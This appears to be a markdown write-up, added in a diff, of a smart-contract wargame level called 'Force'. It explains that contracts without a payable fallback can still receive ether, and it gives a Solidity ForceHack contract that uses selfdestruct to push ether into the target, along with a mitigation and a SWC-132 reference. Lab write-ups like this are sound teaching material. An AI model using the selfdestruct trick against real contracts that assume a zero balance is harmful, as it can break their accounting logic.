@@ -1,0 +1,51 @@
+---
+title: Level 7 - Force
+slug: level-7
+published: 05-17-2023
+lastEdited:
+---
+
+## Objectives
+
+1. Make the Force contract have a balance greater than 0.
+
+## Vulnerabilities
+
+### Expecting that a contract can't hold any ether
+
+A contract that doesn't have a payable fallback function doesn't prevent that contract to have
+a positive balance.
+
+## Exploit
+
+1. Write and deploy a simple hack contact like the following:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IForce {}
+
+contract ForceHack {
+    IForce target;
+
+    constructor(address _targetAddress) payable {
+        target = IForce(_targetAddress);
+    }
+
+    function kaboom() external {
+        selfdestruct(payable(address(target)));
+    }
+}
+```
+
+2. Call the `kaboom` function to `selfdestruct` the ForceHack contract and send the balance to
+   the Force contract.
+
+## Suggested mitigation
+
+1. Simply never rely on the contract having a 0 balance.
+
+## Further reading
+
+- SWC-132 - Unexpected ether balance <ExternalLink href={"https://swcregistry.io/docs/SWC-132"} />
